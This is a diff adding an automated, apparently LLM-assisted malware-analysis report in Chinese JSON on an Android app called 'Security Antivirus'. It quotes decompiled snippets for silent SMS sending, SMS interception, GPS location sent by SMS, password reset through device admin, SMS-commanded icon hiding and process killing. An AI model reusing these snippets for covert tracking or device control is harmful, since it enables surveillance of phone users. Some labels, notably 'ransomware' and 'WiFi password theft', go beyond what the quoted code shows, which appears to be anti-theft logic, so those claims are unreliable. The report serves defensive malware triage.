@@ -1,0 +1,264 @@
+{
+  "APK信息": {
+    "文件名": "126f8aec1d69aa5eda3ac5cf7c0bb783e8a7402e473880059e5aaa1b2b60af60.apk",
+    "sha256": "126f8aec1d69aa5eda3ac5cf7c0bb783e8a7402e473880059e5aaa1b2b60af60",
+    "包名": "com.lullabieskids.antivirus",
+    "应用名": "Security Antivirus",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 420.8
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        },
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        },
+        {
+          "子行为": "wap_billing",
+          "中文名": "WAP计费",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "billing"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\lullabieskids\\classes\\ATClass;",
+          "method_signature": "sendBackSMS(String phoneNumber, String message)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public void sendBackSMS(String phoneNumber, String message) {\n    SmsManager sms = SmsManager.getDefault();\n    sms.sendTextMessage(phoneNumber, null, message, null, null);\n}",
+          "malicious_code_snippet_context": "      }\n  \n      /* JADX INFO: Access modifiers changed from: private */\n>>>     public void sendBackSMS(String phoneNumber, String message) {\n>>>         SmsManager sms = SmsManager.getDefault();\n>>>         sms.sendTextMessage(phoneNumber, null, message, null, null);\n>>>     }\n  \n      /* loaded from: classes.dex */\n      private class MLocationListener implements LocationListener {",
+          "behavior_description": "该方法通过 SmsManager.sendTextMessage() 静默发送短信，无需用户交互或确认。phoneNumber 和 message 作为方法参数传入，可能来源于远程C2服务器下发的指令或拦截到的短信内容。结合上下文中 DevicePolicyManager 重置密码的勒索行为，该短信发送功能很可能用于向攻击者控制的服务器号码回传用户隐私数据或执行短信欺诈操作，直接造成用户资费损失和隐私泄露。",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lcom\\lullabieskids\\receivers\\SmsObserver;",
+          "method_signature": "if(filtered.size()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Object[] pdus = (Object[]) bundle.get(\"pdus\");\nSmsMessage[] msgs = new SmsMessage[pdus.length];\nfor (int i = 0; i < msgs.length; i++) {\n    msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);\n    String phoneNumber = msgs[i].getOriginatingAddress();\n    List<FilterTextMsg> filtered = FilterTextMsg.find(FilterTextMsg.class, \"text = ?\", phoneNumber);\n    if (filtered.size() > 0) {\n        abortBroadcast();\n    }",
+          "malicious_code_snippet_context": "          if (intent.getAction().equals(\"android.provider.Telephony.SMS_RECEIVED\") && (bundle = intent.getExtras()) != null) {\n              try {\n                  AppPrefs prefs = new AppPrefs(context);\n>>>                 Object[] pdus = (Object[]) bundle.get(\"pdus\");\n>>>                 SmsMessage[] msgs = new SmsMessage[pdus.length];\n>>>                 for (int i = 0; i < msgs.length; i++) {\n>>>                     msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);\n>>>                     String phoneNumber = msgs[i].getOriginatingAddress();\n>>>                     String msgBody = msgs[i].getMessageBody();\n>>>                     List<FilterTextMsg> filtered = FilterTextMsg.find(FilterTextMsg.class, \"text = ?\", phoneNumber);\n>>>                     if (filtered.size() > 0) {\n>>>                         abortBroadcast();\n                      } else if ((phoneNumber.equals(prefs.getString(\"antiTheftPhone1\", \"\")) && prefs.getString(\"antiTheftPhone1\", \"\").length() > 0) || ((phoneNumber.equals(prefs.getString(\"antiTheftPhone2\", \"\")) && prefs.getString(\"antiTheftPhone2\", \"\").length() > 0) || (phoneNumber.equals(prefs.getString(\"antiTheftPhone3\", \"\")) && prefs.getString(\"antiTheftPhone3\", \"\").length() > 0))) {\n                          DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService(\"device_policy\");\n                          ComponentName demoDeviceAdmin = new ComponentName(context, (Class<?>) DeviceAdminReceiver.class);",
+          "behavior_description": "代码从广播Intent中提取SMS PDU数据，解析出发送方号码和短信内容，然后查询本地过滤列表FilterTextMsg。如果发送方号码匹配过滤列表中的记录，则调用abortBroadcast()中止短信广播，使该短信无法到达用户收件箱或其他应用，实现短信静默拦截。攻击者可通过远程配置过滤列表来隐藏特定号码的短信（如验证码、银行通知等），为后续欺诈行为创造条件。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "location_tracking",
+      "中文名": "位置追踪",
+      "MITRE": "T1430",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.ACCESS_FINE_LOCATION"
+        ],
+        "字符串": [
+          "getLastKnownLocation",
+          "LocationManager"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\lullabieskids\\classes\\ATClass;",
+          "method_signature": "SetUpLocationListener()",
+          "malicious_behavior": "location_tracking",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "this.locationManager = (LocationManager) ATClass.this.ctx.getSystemService(ECodes.SMS_LOCATE);\nthis.locationManager.requestSingleUpdate(\"gps\", locationListener, null);\nthis.location = this.locationManager.getLastKnownLocation(\"gps\");\npublic void onLocationChanged(Location location) {\n    String message = \"Lat: \" + location.getLatitude() + \" Long:\" + location.getLatitude();\n    ATClass.this.sendBackSMS(ATClass.this.phoneNumber, message);\n}",
+          "malicious_code_snippet_context": "          }\n  \n          public void SetUpLocationListener() {\n>>>             this.locationManager = (LocationManager) ATClass.this.ctx.getSystemService(ECodes.SMS_LOCATE);\n>>>             LocationListener locationListener = new MLocationListener();\n>>>             this.locationManager.requestSingleUpdate(\"gps\", locationListener, (Looper) null);\n>>>             this.location = this.locationManager.getLastKnownLocation(\"gps\");\n>>>         }\n>>> \n>>>         @Override // android.location.LocationListener\n          public void onLocationChanged(Location location) {\n              this.location = location;\n              String message = \"Lat: \" + location.getLatitude() + \" Long:\" + location.getLatitude();",
+          "behavior_description": "代码通过 LocationManager 获取设备 GPS 位置（经纬度），在 onLocationChanged 中构造包含位置信息的短信内容，并通过 sendBackSMS 发送到指定号码，实现位置隐私窃取与追踪。数据流向为 LocationManager.getLastKnownLocation()/onLocationChanged() → sendBackSMS()。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "confirmed",
+      "子行为": [
+        {
+          "子行为": "device_lock",
+          "中文名": "设备锁屏",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "resetPassword",
+              "DevicePolicyManager"
+            ]
+          }
+        },
+        {
+          "子行为": "file_encryption",
+          "中文名": "文件加密",
+          "置信度": "confirmed",
+          "证据": {
+            "方法引用": [
+              "Ljavax/crypto/Cipher;->doFinal",
+              "Ljavax/crypto/Cipher;->init"
+            ],
+            "权限": [],
+            "字符串": [
+              "AES",
+              "encrypt",
+              "decrypt"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\lullabieskids\\AntiTheftActivity;",
+          "method_signature": "onPreferenceClick(Preference preference)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "DevicePolicyManager devicePolicyManager = (DevicePolicyManager) MyPreferenceFragment.this.getActivity().getSystemService(\"device_policy\");\nComponentName demoDeviceAdmin = new ComponentName(MyPreferenceFragment.this.getActivity(), (Class<?>) DeviceAdminReceiver.class);\nif (devicePolicyManager.isAdminActive(demoDeviceAdmin)) {\n    devicePolicyManager.setPasswordQuality(demoDeviceAdmin, 0);\n    devicePolicyManager.setPasswordMinimumLength(demoDeviceAdmin, 0);\n    devicePolicyManager.resetPassword(\"\", 1);\n}",
+          "malicious_code_snippet_context": "              resetAntiTheft.setOnPreferenceClickListener(new Preference.OnPreferenceClickListener() { // from class: com.lullabieskids.AntiTheftActivity.MyPreferenceFragment.7\n                  @Override // android.preference.Preference.OnPreferenceClickListener\n                  public boolean onPreferenceClick(Preference preference) {\n>>>                     DevicePolicyManager devicePolicyManager = (DevicePolicyManager) MyPreferenceFragment.this.getActivity().getSystemService(\"device_policy\");\n>>>                     ComponentName demoDeviceAdmin = new ComponentName(MyPreferenceFragment.this.getActivity(), (Class<?>) DeviceAdminReceiver.class);\n>>>                     if (devicePolicyManager.isAdminActive(demoDeviceAdmin)) {\n>>>                         devicePolicyManager.setPasswordQuality(demoDeviceAdmin, 0);\n>>>                         devicePolicyManager.setPasswordMinimumLength(demoDeviceAdmin, 0);\n>>>                         devicePolicyManager.resetPassword(\"\", 1);\n>>>                     }\n                      return false;\n                  }\n              });",
+          "behavior_description": "代码通过 DevicePolicyManager 获取设备管理权限后，调用 resetPassword() 重置设备锁屏密码。在恶意样本背景下，这是勒索软件典型的设备锁定技术，攻击者可借此设置或清除设备密码，使用户无法正常使用设备，从而实施勒索。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "wifi_password_theft",
+      "中文名": "WiFi密码窃取",
+      "MITRE": "",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.ACCESS_WIFI_STATE",
+          "android.permission.ACCESS_FINE_LOCATION"
+        ],
+        "字符串": [
+          "allowedKeyManagement",
+          "getConfiguredNetworks"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\lullabieskids\\WiFiActivity;",
+          "method_signature": "if(this.activeConfig.allowedKeyManagement.get(1)",
+          "malicious_behavior": "wifi_password_theft",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "if (this.activeConfig.allowedKeyManagement.get(1)) { return 1; } if (this.activeConfig.allowedKeyManagement.get(2)) { return 2; } if (this.activeConfig.allowedKeyManagement.get(3)) { return 3; } return this.activeConfig.wepKeys[0] != null ? 4 : 0;",
+          "malicious_code_snippet_context": "          if (this.activeConfig == null) {\n              return 0;\n          }\n>>>         if (this.activeConfig.allowedKeyManagement.get(1)) {\n              return 1;\n          }\n          if (this.activeConfig.allowedKeyManagement.get(2)) {",
+          "behavior_description": "该代码从系统已保存的WiFi配置对象(WifiConfiguration)中读取加密类型信息(allowedKeyManagement)和WEP密钥(wepKeys)，用于判断当前连接WiFi的加密方式。在恶意样本上下文中，此代码是WiFi密码窃取的前置步骤：先识别加密类型(WPA/WPA2/WEP)，再根据类型提取对应的密码字段(preSharedKey或wepKeys)，为后续窃取并外传WiFi凭据做准备。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\lullabieskids\\classes\\ATClass;",
+          "method_signature": "if(words.get(2)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "if (words.get(2).equals(ECodes.SMS_HIDE)) { PackageManager p = this.ctx.getPackageManager(); ComponentName componentName = new ComponentName(this.ctx, LogoActivity.class); p.setComponentEnabledSetting(componentName, 2, 1); } if (words.get(2).equals(ECodes.SMS_UNHIDE)) { PackageManager p2 = this.ctx.getPackageManager(); ComponentName componentName2 = new ComponentName(this.ctx, LogoActivity.class); p2.setComponentEnabledSetting(componentName2, 1, 1); }",
+          "malicious_code_snippet_context": "if (words.get(2).equals(ECodes.SMS_HIDE)) { PackageManager p = this.ctx.getPackageManager(); ComponentName componentName = new ComponentName(this.ctx, LogoActivity.class); p.setComponentEnabledSetting(componentName, 2, 1); } if (words.get(2).equals(ECodes.SMS_UNHIDE)) { PackageManager p2 = this.ctx.getPackageManager(); ComponentName componentName2 = new ComponentName(this.ctx, LogoActivity.class); p2.setComponentEnabledSetting(componentName2, 1, 1); }",
+          "behavior_description": "代码通过解析短信指令 words.get(2) 判断操作类型。当收到 SMS_HIDE 指令时，调用 PackageManager.setComponentEnabledSetting() 将启动 Activity（LogoActivity）设置为 DISABLED 状态（参数值为2），使应用图标从桌面隐藏；收到 SMS_UNHIDE 指令时则恢复为 ENABLED 状态（参数值为1）。攻击者可通过发送特定短信远程控制应用图标的显示与隐藏，属于恶意软件常用的隐蔽驻留手段。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "process_kill",
+      "中文名": "进程杀死",
+      "MITRE": "",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.KILL_BACKGROUND_PROCESSES"
+        ],
+        "字符串": [
+          "killProcess"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\lullabieskids\\services\\AppProtectService;",
+          "method_signature": "if(info.processName.equalsIgnoreCase(packagename)",
+          "malicious_behavior": "process_kill",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "public void killPackageProcesses(String packagename) {\n    ActivityManager am = (ActivityManager) getSystemService(\"activity\");\n    List<ActivityManager.RunningAppProcessInfo> pids = am.getRunningAppProcesses();\n    for (int i = 0; i < pids.size(); i++) {\n        ActivityManager.RunningAppProcessInfo info = pids.get(i);\n        if (info.processName.equalsIgnoreCase(packagename)) {\n            pid = info.pid;\n        }\n    }\n    Process.killProcess(pid);\n}",
+          "malicious_code_snippet_context": "          }, 2000L, 2000L);\n      }\n  \n>>>     public void killPackageProcesses(String packagename) {\n>>>         int pid = 0;\n>>>         ActivityManager am = (ActivityManager) getSystemService(\"activity\");\n>>>         List<ActivityManager.RunningAppProcessInfo> pids = am.getRunningAppProcesses();\n>>>         for (int i = 0; i < pids.size(); i++) {\n>>>             ActivityManager.RunningAppProcessInfo info = pids.get(i);\n>>>             if (info.processName.equalsIgnoreCase(packagename)) {\n>>>                 pid = info.pid;\n>>>             }\n>>>         }\n>>>         Process.killProcess(pid);\n      }\n  \n      /* JADX INFO: Access modifiers changed from: private */",
+          "behavior_description": "获取系统正在运行的进程列表，匹配指定包名获取其PID，并调用Process.killProcess()强制杀死该进程。结合获取前台包名的方法，可能用于监控并杀死特定应用（如安全软件或竞品应用）以进行自我保护或干扰用户正常使用。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
